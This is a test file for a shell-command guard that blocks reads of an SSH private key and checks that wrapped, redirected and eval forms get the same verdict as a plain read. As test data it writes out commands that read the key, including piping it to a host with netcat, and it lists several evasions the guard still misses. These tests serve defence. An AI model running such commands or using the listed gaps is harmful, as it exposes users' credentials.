import { describe, it, expect } from 'vitest';
import { analyzeFsOperation } from '../shell/index';

// ─────────────────────────────────────────────────────────────────────────────
// REACHABILITY: does the read REACH the jail's matcher at all?
//
// Stage 1 fixed what the matcher decides. This file pins what reaches it.
// Before stage 2, the matcher was consulted only for a path that was a direct
// argv entry of a reader that was argv[0]. Measured at the real gate
// 2026-09-11, controls held, 26 of 31 attack rows were ALLOW:
//
//   ALLOW  env cat X          any wrapper: the reader is argv[1], not argv[0]
//   ALLOW  cat < X            the path is a redirect operand on the Stmt
//   ALLOW  Y=$(<X)            a Stmt with Cmd: null
//   ALLOW  eval "cat X"       the command is one literal word
//   ALLOW  find ~/.ssh -exec cat {} +
//
// THE PRINCIPLE, encoded as the assertion below: every change in stage 2 is a
// NORMALISATION before the matcher, never a new verdict. So for each wrapped
// row the expected value is DERIVED from its unwrapped form -- `env cat X`
// must get exactly what `cat X` already gets, rule name included. A row whose
// unwrapped form is allowed stays allowed, which is what makes the false-
// positive argument hold. Design: doc/jail-stage2-reachability-design.md.
// ─────────────────────────────────────────────────────────────────────────────

const X = '/home/u/.ssh/id_rsa'; // a private key
const D = '/home/u/.ssh'; // the directory itself (stage 1 made this jailed)
const N = '/home/u/p/notes.txt'; // an ordinary file

const v = (cmd: string) => {
  const r = analyzeFsOperation(cmd);
  return r ? `${r.verdict}:${r.ruleName}` : null;
};

/** [label, wrapped, unwrapped] -- wrapped must equal unwrapped, whatever that is. */
type Row = [string, string, string];

const WRAPPERS: Row[] = [
  ['env', `env cat ${X}`, `cat ${X}`],
  ['env with assignment', `env FOO=1 cat ${X}`, `cat ${X}`],
  ['env -', `env - cat ${X}`, `cat ${X}`],
  ['nice -n', `nice -n 5 cat ${X}`, `cat ${X}`],
  ['ionice -c', `ionice -c3 cat ${X}`, `cat ${X}`],
  ['timeout', `timeout 5 cat ${X}`, `cat ${X}`],
  ['timeout -k', `timeout -k 2 5 cat ${X}`, `cat ${X}`],
  ['sudo -u', `sudo -u bob cat ${X}`, `cat ${X}`],
  ['doas', `doas cat ${X}`, `cat ${X}`],
  ['nested wrappers', `sudo env nice cat ${X}`, `cat ${X}`],
  ['nohup', `nohup cat ${X}`, `cat ${X}`],
  ['setsid', `setsid cat ${X}`, `cat ${X}`],
  ['stdbuf -o0', `stdbuf -o0 cat ${X}`, `cat ${X}`],
  ['command', `command cat ${X}`, `cat ${X}`],
  ['exec', `exec cat ${X}`, `cat ${X}`],
  ['watch', `watch cat ${X}`, `cat ${X}`],
  ['xargs with a literal arg', `xargs cat ${X}`, `cat ${X}`],
  // Runners and chroot: reached through unwrapCommandHead, which the inline-
  // exec detector already used and the jail now shares (/code-review, reuse).
  ['npx', `npx cat ${X}`, `cat ${X}`],
  ['uv run', `uv run cat ${X}`, `cat ${X}`],
  ['conda run -n', `conda run -n env cat ${X}`, `cat ${X}`],
  ['chroot', `chroot /mnt cat ${X}`, `cat ${X}`],
  // `time` is a TimeClause in mvdan; the inner Stmt is a plain CallExpr, so this
  // row already held before stage 2. Kept so a parser change shows up here.
  ['time keyword', `time cat ${X}`, `cat ${X}`],
  // Verb variety under a wrapper: the reader set is FS_READ_TOOLS, not `cat`.
  ['env base64', `env base64 ${X}`, `base64 ${X}`],
  ['nice head', `nice head ${X}`, `head ${X}`],
  ['sudo grep on the directory', `sudo grep -r TODO ${D}`, `grep -r TODO ${D}`],
  // A flag directly before the command: unwrapCommandHead used to swallow the
  // reader as the flag's operand (/code-review).
  ['env -', `env - cat ${X}`, `cat ${X}`],
  ['stdbuf -o0', `stdbuf -o0 cat ${X}`, `cat ${X}`],
  ['ionice -c3', `ionice -c3 cat ${X}`, `cat ${X}`],
];

// Verb-agnostic on purpose: `cmd < jailed` feeds the file's bytes to cmd's
// stdin, which is a read of the file whatever cmd is (founder decision 2,
// 2026-09-11). The unwrapped form is therefore always `cat X`.
const REDIRECTS: Row[] = [
  ['cat <', `cat < ${X}`, `cat ${X}`],
  ['redirect before the command', `< ${X} cat`, `cat ${X}`],
  ['explicit fd 0', `cat 0< ${X}`, `cat ${X}`],
  ['read builtin', `read -r L < ${X}; echo $L`, `cat ${X}`],
  ['mapfile builtin', `mapfile -t A < ${X}`, `cat ${X}`],
  ['exec redirect, then cat', `exec < ${X}; cat`, `cat ${X}`],
  ['$(< file)', `Y=$(<${X}); echo $Y`, `cat ${X}`],
  ['while loop', `while read l; do echo $l; done < ${X}`, `cat ${X}`],
  ['tee', `tee /tmp/x < ${X}`, `cat ${X}`],
  ['netcat', `nc h 80 < ${X}`, `cat ${X}`],
  ['ssh stdin', `ssh host cat < ${X}`, `cat ${X}`],
  ['tr', `tr a b < ${X}`, `cat ${X}`],
  ['sort', `sort < ${X}`, `cat ${X}`],
  // `<>` opens the file for reading too; only `<<` / `<<-` / `<<<` supply text.
  ['read-write redirect', `cat <> ${X}`, `cat ${X}`],
  ['explicit fd read-write', `cat 0<> ${X}`, `cat ${X}`],
];

// A pure-literal payload is re-parsed once. A dynamic payload is NOT -- it
// stays with detectDangerousShellExec / evalDynamic, and appears under DYNAMIC.
const STRINGS: Row[] = [
  ['sh -c', `sh -c "cat ${X}"`, `cat ${X}`],
  ['bash -c', `bash -c "cat ${X}"`, `cat ${X}`],
  ['zsh -c', `zsh -c "cat ${X}"`, `cat ${X}`],
  ['dash -c', `dash -c "cat ${X}"`, `cat ${X}`],
  ['single-quoted payload', `sh -c 'cat ${X}'`, `cat ${X}`],
  ['eval quoted', `eval "cat ${X}"`, `cat ${X}`],
  ['eval bare', `eval cat ${X}`, `cat ${X}`],
  ['wrapper inside the payload', `sh -c "env cat ${X}"`, `cat ${X}`],
  ['redirect inside the payload', `sh -c "cat < ${X}"`, `cat ${X}`],
  // A wrapper in FRONT of the interpreter -- the commonest privileged idiom
  // there is, and it ran on argv[0] only until /code-review (2026-09-11).
  ['sudo sh -c', `sudo sh -c "cat ${X}"`, `cat ${X}`],
  ['env sh -c', `env sh -c "cat ${X}"`, `cat ${X}`],
  ['timeout bash -c', `timeout 5 bash -c "cat ${X}"`, `cat ${X}`],
  // isInlineCodeFlag decodes bundles, so these are no longer non-goals.
  ['bash -lc', `bash -lc "cat ${X}"`, `cat ${X}`],
  ['sh -xc', `sh -xc "cat ${X}"`, `cat ${X}`],
];

// `find` is an iterator, not a wrapper: the jailed path is ITS argument and the
// reader comes after -exec. Only a READER after -exec counts here; `-exec cp`
// is the copy-verb question and belongs to stage 4.
const FIND: Row[] = [
  ['find -exec +', `find ${D} -exec cat {} +`, `cat ${D}`],
  ['find -exec ;', `find ${D} -type f -exec cat {} \\;`, `cat ${D}`],
  ['find -execdir', `find ${D} -execdir head {} \\;`, `head ${D}`],
  ['find with a predicate before -exec', `find ${D} -type f -exec cat {} +`, `cat ${D}`],
  ['find -ok', `find ${D} -ok cat {} \\;`, `cat ${D}`],
  ['find -okdir', `find ${D} -okdir cat {} \\;`, `cat ${D}`],
];

// The unwrapped form is ALLOWED, so the wrapped form must be too. This is the
// precision half; without it the suite proves only loudness.
const STAYS_QUIET: Row[] = [
  ['env on an ordinary file', `env cat ${N}`, `cat ${N}`],
  ['sudo on an ordinary file', `sudo cat ${N}`, `cat ${N}`],
  ['redirect from an ordinary file', `sort < ${N}`, `cat ${N}`],
  ['sh -c on an ordinary command', `sh -c "echo hi"`, `echo hi`],
  ['find on an ordinary tree', `find /home/u/p -exec cat {} +`, `cat /home/u/p`],
  ['a longer name is not the jail', `env cat /home/u/.sshfoo/x`, `cat /home/u/.sshfoo/x`],
  // normalizeCommandForPolicy blanks the payload of a message flag BEFORE the
  // jail runs; `-c` is deliberately not on that list (checked 2026-09-11).
  ['commit message naming the key', `git commit -m "cat ${X}"`, `git commit -m ""`],
  ['a runner on an ordinary file', `npx cat ${N}`, `cat ${N}`],
  // find's start points end at the first PREDICATE. Taking every non-flag word
  // before -exec turned an EXCLUSION into a hard block (/code-review).
  [
    'find excluding the jail',
    `find src -not -path '*/.ssh/*' -exec grep -l TODO {} +`,
    `grep -l TODO src`,
  ],
  [
    'find pruning .env',
    `find . -path ./.env -prune -o -type f -exec grep -l TODO {} +`,
    `grep -l TODO .`,
  ],
  ['find -not -name', `find . -not -name .env -exec grep -l TODO {} +`, `grep -l TODO .`],
];

describe('jail reachability — a wrapped read gets the verdict of its unwrapped form', () => {
  const groups: Array<[string, Row[]]> = [
    ['wrappers', WRAPPERS],
    ['redirects', REDIRECTS],
    ['string payloads', STRINGS],
    ['find -exec', FIND],
    ['stays quiet', STAYS_QUIET],
  ];
  for (const [group, rows] of groups) {
    describe(group, () => {
      for (const [label, wrapped, unwrapped] of rows) {
        it(`${label}: \`${wrapped}\``, () => {
          expect(v(wrapped), `wrapped: ${wrapped}\nunwrapped: ${unwrapped}`).toBe(v(unwrapped));
        });
      }
    });
  }

  // The instrument must prove itself: the unwrapped forms this file derives
  // from must themselves be what stage 1 established.
  // These have no meaningful "unwrapped form" to derive from -- asserting
  // v(x) === v(x) cannot fail, which is how two rows sat here proving nothing.
  it.each([
    ['a search for the string .ssh', `grep -r .ssh /home/u/p`],
    ['echo is not a wrapper', `echo cat ${X}`],
    ['a reader NAMED after a wrapper but not run by it', `sudo echo cat ${X}`],
  ])('stays silent: %s', (_l, cmd) => {
    expect(v(cmd)).toBeNull();
  });

  it('controls: the derivation base is sound', () => {
    expect(v(`cat ${X}`)).toMatch(/^block:/);
    expect(v(`cat ${D}`)).toMatch(/^block:/);
    expect(v(`cat ${N}`)).toBeNull();
  });
});

describe('jail reachability — one statement, two hits: the STRICTER wins', () => {
  // `cat KEY < ~/.npmrc` is one Stmt whose redirect is a review-tier read and
  // whose argv is a block-tier one. Committing the redirect verdict and
  // stopping the walk handed back the weaker answer (/code-review): two checks
  // on one input resolve by MAX, never by order.
  it('a review-tier redirect does not pre-empt a block-tier argv path', () => {
    expect(v(`cat ${X} < /home/u/.npmrc`)).toBe(v(`cat ${X}`));
  });
  it('and the review still stands on its own', () => {
    expect(v(`cat /home/u/.npmrc`)).toMatch(/^review:/);
  });
});

describe('jail reachability — a dynamic payload is NOT re-parsed', () => {
  // These carry ParamExp / CmdSubst. The jail cannot know the runtime command
  // and must not guess; detectDangerousShellExec + the Class B evalDynamic
  // knob own them. The jail's answer here is null, and stays null.
  it.each([[`bash -c "base64 $0" ${X}`], [`eval "$CMD"`], [`sh -c "cat $F"`], [`F=${X}; cat $F`]])(
    '%s -> jail says nothing',
    (cmd) => {
      expect(v(cmd)).toBeNull();
    }
  );
});

// Design 5.1 predicted a false positive here -- `sudo echo cat X` -- as the
// price of the chmod detector's "reader anywhere in a wrapper's args" rule.
// /code-review found the better fix: teach unwrapCommandHead that a READER is
// never a flag's operand. The cost is not paid, and the row is in `stays
// silent` above.

describe('jail reachability — non-goals, pinned as failing', () => {
  // Out of scope for stage 2, by design 3.5. `it.fails` so that fixing one of
  // these flips a test rather than passing silently -- the fix should be a
  // deliberate act with its own row, not a side effect.
  it.fails('xargs over stdin', () => {
    expect(v(`echo ${X} | xargs cat`)).toMatch(/^block:/);
  });
  it.fails('xargs -a', () => {
    expect(v(`xargs -a ${X} echo`)).toMatch(/^block:/);
  });
  it.fails('cd then a relative read', () => {
    expect(v(`cd ${D} && cat id_rsa`)).toMatch(/^block:/);
  });
  it.fails('a here-string is a string, not a file', () => {
    expect(v(`xargs -I{} cat {} <<< ${X}`)).toMatch(/^block:/);
  });
  // A reader named by ABSOLUTE PATH. Pre-existing and consistent with stage 1:
  // FS_OP_PRESCREEN_RE has no `/` separator, so `/bin/cat KEY` is allowed at
  // argv[0] too. Fixing it means basenaming `name` in extractLiteralArgs, which
  // every other branch (rm, sql, chmod) reads -- its own change, not this one.
  it.fails('an absolute reader path', () => {
    expect(v(`/bin/cat ${X}`)).toMatch(/^block:/);
  });
  it.fails('an absolute reader path under a wrapper', () => {
    expect(v(`env /bin/cat ${X}`)).toMatch(/^block:/);
  });
  it.fails('depth 2', () => {
    expect(v(`sh -c 'sh -c "cat ${X}"'`)).toMatch(/^block:/);
  });
});
